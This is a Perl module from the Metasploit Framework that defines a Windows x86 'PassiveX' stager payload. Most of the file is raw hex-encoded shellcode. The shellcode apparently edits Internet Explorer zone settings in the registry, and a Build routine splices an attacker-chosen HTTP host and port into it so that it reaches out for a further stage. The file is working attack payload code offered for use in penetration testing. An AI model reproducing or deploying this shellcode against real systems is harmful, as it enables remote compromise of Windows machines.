###############
##
#
#    Name: PassiveXStager.pm
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      IA32 PassiveX stager for Windows.
#
##
###############

package Msf::PayloadComponent::Windows::ia32::PassiveXStager;

use strict;
use base 'Msf::PayloadComponent::Windows::PassiveXStager';

my $info =
{
	Authors       => [ 'skape <mmiller [at] hick.org>', ],
	Arch          => [ 'x86' ],
	Priv          => 0,
	OS            => [ 'win32' ],
	Size          => '',

	# win32 specific code
	Payload       =>
		{
			Offsets => 
				{ 
				},
			Payload =>
				"\xfc\xe8\x76\x00\x00\x00\x53\x6f\x66\x74\x77\x61\x72\x65\x5c\x4d" .
				"\x69\x63\x72\x6f\x73\x6f\x66\x74\x5c\x57\x69\x6e\x64\x6f\x77\x73" .
				"\x5c\x43\x75\x72\x72\x65\x6e\x74\x56\x65\x72\x73\x69\x6f\x6e\x5c" .
				"\x49\x6e\x74\x65\x72\x6e\x65\x74\x20\x53\x65\x74\x74\x69\x6e\x67" .
				"\x73\x5c\x5a\x6f\x6e\x65\x73\x5c\x33\x00\x31\x30\x30\x34\x31\x32" .
				"\x30\x30\x31\x32\x30\x31\x31\x34\x30\x35\x68\x68\x20\x41\x41\x41" .
				"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" .
				"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\xe8\x4f\x00\x00" .
				"\x00\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" .
				"\x4f\x18\x8b\x5f\x20\x01\xeb\xe3\x33\x49\x8b\x34\x8b\x01\xee\x31" .
				"\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b" .
				"\x54\x24\x28\x75\xe2\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f" .
				"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc2\x08\x00" .
				"\x5f\x5b\x31\xd2\x64\x8b\x42\x30\x85\xc0\x78\x0f\x8b\x40\x0c\x8b" .
				"\x70\x1c\xad\x8b\x40\x08\xe9\x0b\x00\x00\x00\x8b\x40\x34\x05\x7c" .
				"\x00\x00\x00\x8b\x40\x3c\x89\xe5\x68\x72\xfe\xb3\x16\x50\x68\x8e" .
				"\x4e\x0e\xec\x50\xff\xd7\x96\xff\xd7\x89\x45\x00\x52\x68\x70\x69" .
				"\x33\x32\x68\x61\x64\x76\x61\x54\xff\xd6\x68\xa9\x2b\x92\x02\x50" .
				"\x68\xdd\x9a\x1c\x2d\x50\xff\xd7\x89\x45\x04\xff\xd7\x97\x87\xf3" .
				"\x54\x56\x68\x01\x00\x00\x80\xff\xd7\x5b\x83\xc6\x44\x50\x89\xe7" .
				"\x80\x3e\x68\x74\x13\x50\xad\x50\x89\xe0\x6a\x04\x57\x6a\x04\x6a" .
				"\x00\x50\x53\xff\x55\x04\xeb\xe8\x68\x54\x00\x00\x00\x59\x29\xcc" .
				"\x89\xe7\x57\xf3\xaa\x5f\xc6\x07\x44\xfe\x47\x2c\xfe\x47\x2d\x57" .
				"\x57\x50\x50\x6a\x10\x50\x50\x50\x56\x50\xff\x55\x00\xcc"
		},
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

#
# Builds the actual payload based on the environment
#
sub Build
{
	my $self = shift;
	my $payload = $self->SUPER::Build();
	my $url = "http://" . $self->GetVar('PXHTTPHOST') . ":" . $self->GetVar('PXHTTPPORT') . "/" . "\x00";

	if (length($url) > 32)
	{
		$self->PrintLine("[-] URL is too big (" . length($url) . ")");
		return undef;
	}

	substr($payload, 93, length($url), $url);
		
	return $payload;
}

1;
